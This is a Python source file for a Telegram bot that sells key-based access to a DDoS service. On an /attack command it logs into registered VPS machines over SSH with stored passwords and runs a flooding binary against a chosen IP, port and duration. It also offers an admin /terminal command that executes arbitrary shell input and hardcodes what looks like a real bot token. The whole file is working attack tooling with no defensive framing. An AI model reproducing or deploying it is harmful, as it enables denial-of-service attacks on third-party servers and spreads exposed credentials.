import asyncio
import logging
import subprocess
import uuid
from aiogram import Bot, Dispatcher, types, executor
from aiogram.types import ParseMode, InlineKeyboardMarkup, InlineKeyboardButton

API_TOKEN = '7327182448:AAHVOa7HpJIcXWRs5eeTM_Iklsx7wTzqPts'
ADMIN_ID = 5879359815

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

allowed_keys = {}
used_keys = set()
allowed_users = set()
vps_list = []  # [{'ip': '', 'username': '', 'password': '', 'attacking': False}]
default_threads = 1000
max_time = 240

# Keyboard Buttons
user_keyboard = InlineKeyboardMarkup(row_width=2)
user_keyboard.add(
    InlineKeyboardButton("Redeem Key", callback_data='redeem'),
    InlineKeyboardButton("Start Attack", callback_data='attack')
)

admin_keyboard = InlineKeyboardMarkup(row_width=2)
admin_keyboard.add(
    InlineKeyboardButton("Generate Key", callback_data='genkey'),
    InlineKeyboardButton("Add VPS", callback_data='addvps'),
    InlineKeyboardButton("VPS Status", callback_data='vpsstatus'),
    InlineKeyboardButton("Set Threads", callback_data='threads'),
    InlineKeyboardButton("Set Max Time", callback_data='maxtime'),
    InlineKeyboardButton("Terminal", callback_data='terminal')
)

# START
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.reply("👑 Welcome Admin! Choose an option:", reply_markup=admin_keyboard)
    else:
        await message.reply("🤖 Welcome! Choose a command:", reply_markup=user_keyboard)

# VPS ADD (No Name)
@dp.message_handler(commands=['addvps'])
async def add_vps(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Access Denied")
    args = message.text.split()
    if len(args) != 4:
        return await message.reply("Usage: /addvps <ip> <username> <password>")
    ip, username, password = args[1:]
    vps_list.append({'ip': ip, 'username': username, 'password': password, 'attacking': False})
    await message.reply(f"✅ VPS added:\nIP: `{ip}`\nUser: `{username}`", parse_mode=ParseMode.MARKDOWN)

@dp.message_handler(commands=['vpsstatus'])
async def vps_status(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Access Denied")
    if not vps_list:
        return await message.reply("⚠️ No VPS added.")
    text = "\n📡 *VPS Status:*\n"
    for idx, vps in enumerate(vps_list):
        text += f"\n#{idx+1} - IP: `{vps['ip']}` - Attacking: `{vps['attacking']}`"
    await message.reply(text, parse_mode=ParseMode.MARKDOWN)

# KEY SYSTEM
@dp.message_handler(commands=['genkey'])
async def generate_key(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Access Denied")
    key = str(uuid.uuid4())[:8]
    allowed_keys[key] = True
    await message.reply(f"✅ Key generated: `{key}`", parse_mode=ParseMode.MARKDOWN)

@dp.message_handler(commands=['redeem'])
async def redeem_key(message: types.Message):
    args = message.text.split()
    if len(args) != 2:
        return await message.reply("Usage: /redeem <key>")
    key = args[1]
    if key in allowed_keys and key not in used_keys:
        used_keys.add(key)
        allowed_keys[key] = False
        allowed_users.add(message.from_user.id)
        await message.reply("✅ Key redeemed. You now have access.")
    else:
        await message.reply("❌ Invalid or already used key.")

# SETTINGS
@dp.message_handler(commands=['threads'])
async def set_threads(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Access Denied")
    try:
        global default_threads
        default_threads = int(message.text.split()[1])
        await message.reply(f"✅ Threads set to {default_threads}")
    except:
        await message.reply("Usage: /threads <number>")

@dp.message_handler(commands=['maxtime'])
async def set_maxtime(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Access Denied")
    try:
        global max_time
        max_time = int(message.text.split()[1])
        await message.reply(f"✅ Max time set to {max_time} seconds")
    except:
        await message.reply("Usage: /maxtime <seconds>")

@dp.message_handler(commands=['terminal'])
async def terminal_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Access Denied")
    cmd = message.text.replace("/terminal", "").strip()
    if not cmd:
        return await message.reply("Usage: /terminal <command>")
    try:
        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        await message.reply(f"```\n{output}\n```", parse_mode=ParseMode.MARKDOWN)
    except subprocess.CalledProcessError as e:
        await message.reply(f"❌ Error:\n{e}")

# ATTACK SYSTEM (use any added VPS)
@dp.message_handler(commands=['attack'])
async def start_attack(message: types.Message):
    if message.from_user.id != ADMIN_ID and message.from_user.id not in allowed_users:
        return await message.reply("⛔ Access Denied")
    args = message.text.split()
    if len(args) < 4:
        return await message.reply("Usage: /attack <ip> <port> <time> [threads]")
    
    ip, port = args[1], args[2]
    try:
        time = int(args[3])
        if time > max_time:
            return await message.reply(f"❌ Max time is {max_time} seconds")
        threads = args[4] if len(args) > 4 else default_threads
    except:
        return await message.reply("Invalid time or thread format")

    if not vps_list:
        return await message.reply("❌ No VPS available")

    # Pick first available VPS
    for vps in vps_list:
        if not vps['attacking']:
            vps['attacking'] = True
            cmd = f"./Moin {ip} {port} {time} {threads} 1"
            ssh_cmd = f"sshpass -p '{vps['password']}' ssh -o StrictHostKeyChecking=no {vps['username']}@{vps['ip']} '{cmd}'"

            msg = await message.reply(f"🚀 Attack started:\nTarget: `{ip}:{port}`\nTime: {time}s\nThreads: {threads}\nVPS: `{vps['ip']}`", parse_mode=ParseMode.MARKDOWN)

            # Start async attack
            await asyncio.create_subprocess_shell(ssh_cmd)
            await asyncio.sleep(time)
            vps['attacking'] = False
            await msg.edit_text(f"✅ Attack ended on `{vps['ip']}`", parse_mode=ParseMode.MARKDOWN)
            return

    await message.reply("⚠️ All VPS are busy. Try again later.")

# CALLBACKS (optional)
@dp.callback_query_handler(lambda c: True)
async def callback_buttons(callback_query: types.CallbackQuery):
    await bot.answer_callback_query(callback_query.id)
    if callback_query.data == 'redeem':
        await bot.send_message(callback_query.from_user.id, "Use /redeem <key>")
    elif callback_query.data == 'attack':
        await bot.send_message(callback_query.from_user.id, "Use /attack <ip> <port> <time> [threads]")
    elif callback_query.data == 'genkey':
        await generate_key(types.Message(chat=callback_query.message.chat, from_user=callback_query.from_user, text="/genkey"))
    elif callback_query.data == 'addvps':
        await bot.send_message(callback_query.from_user.id, "Use /addvps <ip> <username> <password>")
    elif callback_query.data == 'vpsstatus':
        await vps_status(types.Message(chat=callback_query.message.chat, from_user=callback_query.from_user, text="/vpsstatus"))
    elif callback_query.data == 'threads':
        await bot.send_message(callback_query.from_user.id, "Use /threads <number>")
    elif callback_query.data == 'maxtime':
        await bot.send_message(callback_query.from_user.id, "Use /maxtime <seconds>")
    elif callback_query.data == 'terminal':
        await bot.send_message(callback_query.from_user.id, "Use /terminal <command>")

# RUN
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    executor.start_polling(dp, skip_updates=True)